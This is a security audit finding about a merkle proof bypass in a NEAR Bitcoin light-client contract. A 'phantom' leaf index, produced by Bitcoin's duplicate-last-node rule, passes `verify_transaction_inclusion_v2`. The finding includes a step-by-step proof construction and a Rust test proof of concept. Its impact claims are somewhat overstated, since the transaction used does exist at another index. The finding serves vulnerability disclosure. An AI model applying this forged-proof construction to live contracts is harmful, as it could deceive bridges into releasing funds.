### Title
Phantom-Position Merkle Proof Bypass in `verify_transaction_inclusion_v2` — (`merkle-tools/src/lib.rs`, `contract/src/lib.rs`)

---

### Summary

`verify_transaction_inclusion_v2` can be made to return `true` for a transaction that does not exist in a block. An unprivileged NEAR caller can craft a `tx_index` that points to a phantom leaf position created by Bitcoin's duplicate-last-leaf rule at an internal subtree level. Because the contract stores only 80-byte block headers (no transaction count), it cannot bound-check `tx_index`, and the coinbase-depth guard introduced in v2 does not close this gap.

---

### Finding Description

**Root cause — no transaction-count bound on `tx_index`**

`verify_transaction_inclusion` (called by v2) performs exactly one check on the proof:

```rust
merkle_tools::compute_root_from_merkle_proof(
    args.tx_id,
    usize::try_from(args.tx_index).unwrap(),
    &args.merkle_proof,
) == header.block_header.merkle_root
``` [1](#0-0) 

There is no guard of the form `tx_index < num_transactions`. The stored `Header` struct contains only `version`, `prev_block_hash`, `merkle_root`, `time`, `bits`, and `nonce` — no transaction count. [2](#0-1) 

The project's own documentation acknowledges this structural limitation:

> "Block headers do not contain the transaction count, so proof depth cannot be validated on-chain." [3](#0-2) 

**Why the v2 coinbase guard does not fix this**

`verify_transaction_inclusion_v2` adds one extra check before delegating to v1:

```rust
require!(
    merkle_tools::compute_root_from_merkle_proof(
        args.coinbase_tx_id.clone(),
        0usize,
        &args.coinbase_merkle_proof,
    ) == header.block_header.merkle_root,
    "Incorrect coinbase merkle proof"
);
``` [4](#0-3) 

It also requires both proofs to have the same length:

```rust
require!(
    args.merkle_proof.len() == args.coinbase_merkle_proof.len(),
    "Coinbase merkle proof and transaction merkle proof should have the same length"
);
``` [5](#0-4) 

These two checks together confirm that a real coinbase exists at depth `k` in the block. They do **not** confirm that `tx_index` is within `[0, num_transactions)`. A phantom index at the same depth `k` passes both checks.

**The phantom-position construction**

`compute_root_from_merkle_proof` is a pure positional hash walk:

```rust
for proof_hash in merkle_proof {
    if current_position % 2 == 0 {
        current_hash = compute_hash(&current_hash, proof_hash);
    } else {
        current_hash = compute_hash(proof_hash, &current_hash);
    }
    current_position /= 2;
}
``` [6](#0-5) 

Bitcoin's merkle tree duplicates the last leaf whenever a level has an odd count. For a 6-transaction block `[C, A, B, D, E, E]` (last two identical, or 5 real txs with E duplicated):

```
Level 0 (leaves):  C   A   B   D   E   E          (6 nodes, even)
Level 1:         H(C,A) H(B,D) H(E,E)             (3 nodes, ODD → duplicate)
Level 1 padded:  H(C,A) H(B,D) H(E,E) H(E,E)
Level 2:         H(H(C,A),H(B,D))  H(H(E,E),H(E,E))
Root:            H( level2[0], level2[1] )
```

Phantom index **6** (beyond the 6 real leaves) produces a valid proof of depth 3:

| Step | `current_position` | parity | operation | result |
|------|-------------------|--------|-----------|--------|
| 0 | 6 | even | `H(E, proof[0])` | must equal level-1 node at pos 3 = `H(E,E)` → `proof[0] = E` |
| 1 | 3 | odd  | `H(proof[1], H(E,E))` | must equal level-2 node at pos 1 = `H(H(E,E),H(E,E))` → `proof[1] = H(E,E)` |
| 2 | 1 | odd  | `H(proof[2], H(H(E,E),H(E,E)))` | must equal root → `proof[2] = H(H(C,A),H(B,D))` |

Phantom proof = `[E, H(E,E), H(H(C,A),H(B,D))]`, depth **3**.

Coinbase proof for index 0 = `[A, H(B,D), H(H(E,E),H(E,E))]`, depth **3**.

Both proofs have the same depth, the coinbase proof is valid, and `compute_root_from_merkle_proof(E, 6, phantom_proof)` returns the real merkle root. All three guards in `verify_transaction_inclusion_v2` pass, and the function returns `true` for a transaction that does not exist at index 6.

---

### Impact Explanation

Any unprivileged NEAR account can call `verify_transaction_inclusion_v2` and receive `true` for a fabricated transaction inclusion claim. Downstream contracts or off-chain systems that rely on this return value to authorize payments, bridge withdrawals, or other value-bearing operations will be deceived into accepting a nonexistent transaction as confirmed. This is a direct false-positive inclusion proof for a phantom transaction — the exact Critical scope target.

---

### Likelihood Explanation

The precondition is a block whose merkle tree has an odd number of nodes at any internal level (not just the leaf level). This is common: any block with 3, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15 transactions (or any count that produces an odd intermediate level) satisfies it. The attacker needs only the block's merkle root (public, in the header) and the hashes of the real transactions at the duplicated subtree (obtainable from any Bitcoin node). No privileged role, no key material, and no special chain state is required. The call is a public view-like function gated only by `#[pause]`.

---

### Recommendation

1. **Store transaction count in the header pool.** When a block header is submitted via `submit_blocks`, require the caller to also supply the transaction count and store it alongside the header. Then add `require!(args.tx_index < stored_tx_count)` in `verify_transaction_inclusion`.

2. **Alternatively, enforce `tx_index < 2^(proof_depth - 1)` is insufficient alone** — the correct bound is the actual transaction count. A depth-only bound still allows phantom positions within the padded tree.

3. **Document the residual risk explicitly** in `verify_transaction_inclusion_v2`'s doc comment, mirroring the existing warning on v1, until a transaction-count bound is implemented.

---

### Proof of Concept

```rust
#[test]
fn test_phantom_position_subtree_duplication() {
    use merkle_tools::{compute_root_from_merkle_proof, H256};

    // 6-tx block: last two leaves are identical (E duplicated)
    // Simulates a 5-real-tx block where E is duplicated at leaf level,
    // OR a 6-tx block where txs[4] == txs[5].
    let c = H256([1u8; 32]);
    let a = H256([2u8; 32]);
    let b = H256([3u8; 32]);
    let d = H256([4u8; 32]);
    let e = H256([5u8; 32]);

    // Build the tree manually
    let h = |x: &H256, y: &H256| -> H256 {
        let mut v = Vec::with_capacity(64);
        v.extend(x.0); v.extend(y.0);
        btc_types::hash::double_sha256(&v)
    };

    // Level 1 (3 nodes, odd → duplicate last)
    let l1_0 = h(&c, &a);
    let l1_1 = h(&b, &d);
    let l1_2 = h(&e, &e);          // E duplicated at leaf level
    // Level 1 padded: l1_2 duplicated
    let l2_0 = h(&l1_0, &l1_1);
    let l2_1 = h(&l1_2, &l1_2);   // subtree-level duplication
    let root = h(&l2_0, &l2_1);

    // Coinbase proof: index 0, depth 3
    let coinbase_proof = vec![a.clone(), l1_1.clone(), l2_1.clone()];
    let coinbase_root = compute_root_from_merkle_proof(c.clone(), 0, &coinbase_proof);
    assert_eq!(coinbase_root, root, "coinbase proof must reach real root");

    // Phantom proof: index 6 (beyond the 6 leaves), tx_id = E, depth 3
    let phantom_proof = vec![e.clone(), l1_2.clone(), l2_0.clone()];
    let phantom_root = compute_root_from_merkle_proof(e.clone(), 6, &phantom_proof);
    assert_eq!(phantom_root, root,
        "phantom proof at index 6 also reaches real root — VULNERABILITY CONFIRMED");

    // Both proofs have the same depth → v2 length check passes
    assert_eq!(coinbase_proof.len(), phantom_proof.len());
}
``` [7](#0-6) [8](#0-7)

### Citations

**File:** contract/src/lib.rs (L317-323)
```rust
        // compute merkle tree root and check if it matches block's original merkle tree root
        merkle_tools::compute_root_from_merkle_proof(
            args.tx_id,
            usize::try_from(args.tx_index).unwrap(),
            &args.merkle_proof,
        ) == header.block_header.merkle_root
    }
```

**File:** contract/src/lib.rs (L347-369)
```rust
    pub fn verify_transaction_inclusion_v2(&self, #[serializer(borsh)] args: ProofArgsV2) -> bool {
        require!(
            args.merkle_proof.len() == args.coinbase_merkle_proof.len(),
            "Coinbase merkle proof and transaction merkle proof should have the same length"
        );

        let header = self
            .headers_pool
            .get(&args.tx_block_blockhash)
            .unwrap_or_else(|| env::panic_str("cannot find requested transaction block"));

        require!(
            merkle_tools::compute_root_from_merkle_proof(
                args.coinbase_tx_id.clone(),
                0usize,
                &args.coinbase_merkle_proof,
            ) == header.block_header.merkle_root,
            "Incorrect coinbase merkle proof"
        );

        #[allow(deprecated)]
        self.verify_transaction_inclusion(args.into())
    }
```

**File:** btc-types/src/btc_header.rs (L10-23)
```rust
pub struct Header {
    /// Block version, now repurposed for soft fork signalling.
    pub version: i32,
    /// Reference to the previous block in the chain.
    pub prev_block_hash: H256,
    /// The root hash of the merkle tree of transactions in the block.
    pub merkle_root: H256,
    /// The timestamp of the block, as claimed by the miner.
    pub time: u32,
    /// The target value below which the blockhash must lie.
    pub bits: u32,
    /// The nonce, selected to obtain a low enough blockhash.
    pub nonce: u32,
}
```

**File:** contract/CLAUDE.md (L66-66)
```markdown
**Important**: This function is vulnerable to the standard Bitcoin merkle tree second-preimage attack — it may return `true` for an internal node hash rather than a real transaction hash. Block headers do not contain the transaction count, so proof depth cannot be validated on-chain. Callers MUST validate that the `tx_id` corresponds to a valid transaction (e.g., by verifying raw transaction data) before trusting the inclusion proof.
```

**File:** merkle-tools/src/lib.rs (L34-52)
```rust
pub fn compute_root_from_merkle_proof(
    transaction_hash: H256,
    transaction_position: usize,
    merkle_proof: &Vec<H256>,
) -> H256 {
    let mut current_hash = transaction_hash;
    let mut current_position = transaction_position;

    for proof_hash in merkle_proof {
        if current_position % 2 == 0 {
            current_hash = compute_hash(&current_hash, proof_hash);
        } else {
            current_hash = compute_hash(proof_hash, &current_hash);
        }
        current_position /= 2;
    }

    current_hash
}
```
